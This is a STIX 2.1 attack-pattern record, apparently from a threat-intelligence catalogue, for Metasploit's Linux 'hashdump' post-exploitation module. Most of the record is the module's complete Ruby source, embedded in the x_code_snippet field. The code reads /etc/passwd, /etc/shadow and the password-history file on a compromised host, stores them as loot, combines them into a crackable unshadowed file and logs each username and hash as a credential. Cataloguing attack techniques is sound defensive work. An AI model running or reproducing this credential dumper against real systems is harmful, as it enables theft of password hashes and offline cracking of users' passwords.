{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9ebf3b16-d259-4566-8dc9-cb18a8970edb",
    "created": "2024-08-14T16:33:17.982838Z",
    "modified": "2024-08-14T16:33:17.982842Z",
    "name": "Linux Gather Dump Password Hashes for Linux Systems",
    "description": "Post Module to dump the password hashes for all users on a Linux System 'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/linux/gather/hashdump.rb",
            "external_id": "hashdump.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Linux Gather Dump Password Hashes for Linux Systems',\n        'Description' => %q{ Post Module to dump the password hashes for all users on a Linux System},\n        'License' => MSF_LICENSE,\n        'Author' => ['Carlos Perez <carlos_perez[at]darkoperator.com>'],\n        'Platform' => ['linux'],\n        'SessionTypes' => ['shell', 'meterpreter']\n      )\n    )\n  end\n\n  # Run Method for when run command is issued\n  def run\n    unless readable?('/etc/shadow')\n      fail_with Failure::NoAccess, 'Shadow file must be readable in order to dump hashes'\n    end\n\n    passwd_file = read_file('/etc/passwd')\n    unless passwd_file.nil?\n      p = store_loot('linux.passwd', 'text/plain', session, passwd_file, 'passwd.tx', 'Linux Passwd File')\n      vprint_good(\"passwd saved in: #{p}\")\n    end\n\n    shadow_file = read_file('/etc/shadow')\n    unless shadow_file.nil?\n      p = store_loot('linux.shadow', 'text/plain', session, shadow_file, 'shadow.tx', 'Linux Password Shadow File')\n      vprint_good(\"Shadow saved in: #{p}\")\n    end\n\n    opasswd_file = read_file('/etc/security/opasswd')\n    unless opasswd_file.nil?\n      p = store_loot('linux.passwd.history', 'text/plain', session, opasswd_file, 'opasswd.tx', 'Linux Passwd History File')\n      vprint_good(\"opasswd saved in: #{p}\")\n    end\n\n    # Unshadow the files\n    john_file = unshadow(passwd_file.to_s, shadow_file.to_s)\n    return if john_file == ''\n\n    john_file.each_line do |l|\n      hash_parts = l.split(':')\n      jtr_format = Metasploit::Framework::Hashes.identify_hash hash_parts[1]\n\n      if jtr_format.empty? # overide the default\n        jtr_format = 'des,bsdi,crypt'\n      end\n\n      credential_data = {\n        jtr_format: jtr_format,\n        origin_type: :session,\n        post_reference_name: refname,\n        private_type: :nonreplayable_hash,\n        private_data: hash_parts[1],\n        session_id: session_db_id,\n        username: hash_parts[0],\n        workspace_id: myworkspace_id\n      }\n      create_credential(credential_data)\n      print_good(l.chomp)\n    end\n\n    # Save passwd file\n    upasswd = store_loot('linux.hashes', 'text/plain', session, john_file, 'unshadowed_passwd.pwd', 'Linux Unshadowed Password File')\n    print_good(\"Unshadowed Password File: #{upasswd}\")\n  end\n\n  def unshadow(pf, sf)\n    unshadowed = ''\n    sf.each_line do |sl|\n      pass = sl.scan(/^\\w*:([^:]*)/).join\n\n      next if pass == '*'\n      next if pass == '!'\n\n      user = sl.scan(/(^\\w*):/).join\n      pf.each_line do |pl|\n        next unless pl.match(/^#{user}:/)\n\n        unshadowed << pl.gsub(/:x:/, \":#{pass}:\")\n      end\n    end\n\n    unshadowed\n  end\nend\n",
    "x_mitre_platforms": [
        "['linux']"
    ]
}